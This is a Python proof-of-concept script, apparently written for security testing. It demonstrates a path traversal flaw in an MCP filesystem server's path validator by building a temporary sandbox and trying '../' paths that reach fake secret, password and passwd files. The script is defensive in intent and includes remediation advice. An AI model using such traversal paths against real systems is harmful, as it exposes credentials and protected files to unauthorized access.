#!/usr/bin/env python3
"""
Proof of Concept: Critical Path Traversal Vulnerability in MCP Filesystem Server

This script demonstrates the critical security vulnerability in the PathValidator
class that allows attackers to bypass directory restrictions and access files
outside the allowed directories.

VULNERABILITY: CWE-22 (Path Traversal)
SEVERITY: CRITICAL (CVSS 9.1)
LOCATION: mcp_filesystem/security.py lines 143-155

DO NOT USE THIS SCRIPT FOR MALICIOUS PURPOSES.
This is for security testing and demonstration only.
"""

import asyncio
import tempfile
import os
from pathlib import Path
import sys

# Add the project directory to the path
sys.path.insert(0, '/Users/robert.lee/GithubProjects/mcp-filesystem')

from mcp_filesystem.security import PathValidator


class PathTraversalExploit:
    """Demonstrates the path traversal vulnerability."""
    
    def __init__(self):
        self.test_env = None
        
    async def setup_test_environment(self):
        """Create a test environment with restricted and sensitive directories."""
        print("🔧 Setting up test environment...")
        
        # Create temporary directory structure
        self.temp_dir = tempfile.mkdtemp()
        base_dir = Path(self.temp_dir)
        
        # Create allowed directory
        allowed_dir = base_dir / "allowed_directory"
        allowed_dir.mkdir()
        
        # Create sensitive directories that should be protected
        sensitive_dir = base_dir / "sensitive"
        sensitive_dir.mkdir()
        
        system_dir = base_dir / "system"
        system_dir.mkdir()
        
        # Create sensitive files
        (sensitive_dir / "secret.txt").write_text("TOP SECRET INFORMATION")
        (sensitive_dir / "passwords.txt").write_text("admin:password123")
        (system_dir / "passwd").write_text("root:x:0:0:root:/root:/bin/bash")
        
        # Create safe files in allowed directory
        (allowed_dir / "safe.txt").write_text("This is safe content")
        
        self.test_env = {
            "base_dir": base_dir,
            "allowed_dir": allowed_dir,
            "sensitive_dir": sensitive_dir,
            "system_dir": system_dir
        }
        
        print(f"✅ Test environment created at: {self.temp_dir}")
        print(f"   Allowed directory: {allowed_dir}")
        print(f"   Sensitive directory: {sensitive_dir}")
        print(f"   System directory: {system_dir}")
        
    async def test_vulnerability(self):
        """Test the path traversal vulnerability."""
        if not self.test_env:
            await self.setup_test_environment()
            
        # Initialize PathValidator with only the allowed directory
        validator = PathValidator([str(self.test_env["allowed_dir"])])
        
        print("\n🔍 Testing Path Traversal Vulnerability...")
        print("=" * 60)
        
        # Test cases that should be blocked but aren't due to the vulnerability
        attack_vectors = [
            {
                "name": "Basic Path Traversal",
                "path": str(self.test_env["allowed_dir"]) + "/../sensitive/secret.txt",
                "target": "sensitive/secret.txt"
            },
            {
                "name": "System File Access", 
                "path": str(self.test_env["allowed_dir"]) + "/../system/passwd",
                "target": "system/passwd"
            },
            {
                "name": "Password File Access",
                "path": str(self.test_env["allowed_dir"]) + "/../sensitive/passwords.txt", 
                "target": "sensitive/passwords.txt"
            },
            {
                "name": "Multiple Directory Traversal",
                "path": str(self.test_env["allowed_dir"]) + "/../../" + str(self.test_env["sensitive_dir"].name) + "/secret.txt",
                "target": "sensitive/secret.txt"
            }
        ]
        
        vulnerabilities_found = 0
        
        for attack in attack_vectors:
            print(f"\n🎯 Testing: {attack['name']}")
            print(f"   Attack Path: {attack['path']}")
            
            try:
                result_path, allowed = await validator.validate_path(attack['path'])
                
                if allowed:
                    vulnerabilities_found += 1
                    print(f"   🚨 VULNERABILITY CONFIRMED!")
                    print(f"   ❌ Path was ALLOWED when it should be BLOCKED")
                    print(f"   📁 Resolved to: {result_path}")
                    
                    # Try to read the file to prove access
                    if result_path.exists():
                        try:
                            content = result_path.read_text()
                            print(f"   📄 File content preview: {content[:50]}...")
                        except Exception as e:
                            print(f"   ⚠️  Could not read file: {e}")
                    else:
                        print(f"   ℹ️  File does not exist (but path was allowed)")
                        
                else:
                    print(f"   ✅ Attack blocked (path validation failed)")
                    
            except Exception as e:
                print(f"   ⚠️  Exception during test: {e}")
                
        return vulnerabilities_found
        
    async def demonstrate_impact(self):
        """Demonstrate the real-world impact of this vulnerability."""
        print("\n💥 IMPACT DEMONSTRATION")
        print("=" * 60)
        
        if not self.test_env:
            await self.setup_test_environment()
            
        validator = PathValidator([str(self.test_env["allowed_dir"])])
        
        # Show what an attacker could access
        sensitive_files = [
            self.test_env["sensitive_dir"] / "secret.txt",
            self.test_env["sensitive_dir"] / "passwords.txt", 
            self.test_env["system_dir"] / "passwd"
        ]
        
        print("Files an attacker could potentially access:")
        
        for sensitive_file in sensitive_files:
            # Construct attack path
            attack_path = str(self.test_env["allowed_dir"]) + "/../" + str(sensitive_file.relative_to(self.test_env["base_dir"]))
            
            result_path, allowed = await validator.validate_path(attack_path)
            
            if allowed and result_path.exists():
                content = result_path.read_text()
                print(f"\n📁 {sensitive_file.name}:")
                print(f"   Path: {attack_path}")
                print(f"   Content: {content}")
            
    async def test_legitimate_access(self):
        """Test that legitimate access still works."""
        print("\n✅ LEGITIMATE ACCESS TEST")
        print("=" * 60)
        
        if not self.test_env:
            await self.setup_test_environment()
            
        validator = PathValidator([str(self.test_env["allowed_dir"])])
        
        # Test legitimate file access
        safe_file = self.test_env["allowed_dir"] / "safe.txt"
        result_path, allowed = await validator.validate_path(str(safe_file))
        
        if allowed:
            print(f"✅ Legitimate access works: {safe_file}")
            print(f"   Content: {result_path.read_text()}")
        else:
            print(f"❌ Legitimate access blocked - this indicates the fix broke normal functionality")
            
    def cleanup(self):
        """Clean up test environment."""
        if self.test_env:
            import shutil
            shutil.rmtree(self.temp_dir)
            print(f"\n🧹 Cleaned up test environment: {self.temp_dir}")


async def main():
    """Main exploit demonstration."""
    print("🔐 MCP Filesystem Server - Path Traversal Vulnerability Demonstration")
    print("=" * 80)
    print("⚠️  WARNING: This demonstrates a CRITICAL security vulnerability")
    print("⚠️  DO NOT use this for malicious purposes!")
    print("=" * 80)
    
    exploit = PathTraversalExploit()
    
    try:
        # Setup test environment
        await exploit.setup_test_environment()
        
        # Test the vulnerability
        vulnerabilities = await exploit.test_vulnerability()
        
        # Demonstrate impact
        await exploit.demonstrate_impact()
        
        # Test legitimate access
        await exploit.test_legitimate_access()
        
        # Summary
        print("\n📊 VULNERABILITY ASSESSMENT SUMMARY")
        print("=" * 60)
        print(f"Vulnerabilities Found: {vulnerabilities}")
        
        if vulnerabilities > 0:
            print("🚨 CRITICAL: Path traversal vulnerability confirmed!")
            print("🚨 Attackers can access files outside allowed directories!")
            print("🚨 IMMEDIATE ACTION REQUIRED!")
        else:
            print("✅ No path traversal vulnerabilities detected")
            
        print("\n🔧 REMEDIATION:")
        print("1. Fix the PathValidator._validate_path_security() method")
        print("2. Use proper path resolution instead of string prefix matching")
        print("3. Implement comprehensive security testing")
        print("4. Deploy security patches immediately")
        
    except Exception as e:
        print(f"❌ Error during exploit demonstration: {e}")
        import traceback
        traceback.print_exc()
        
    finally:
        exploit.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
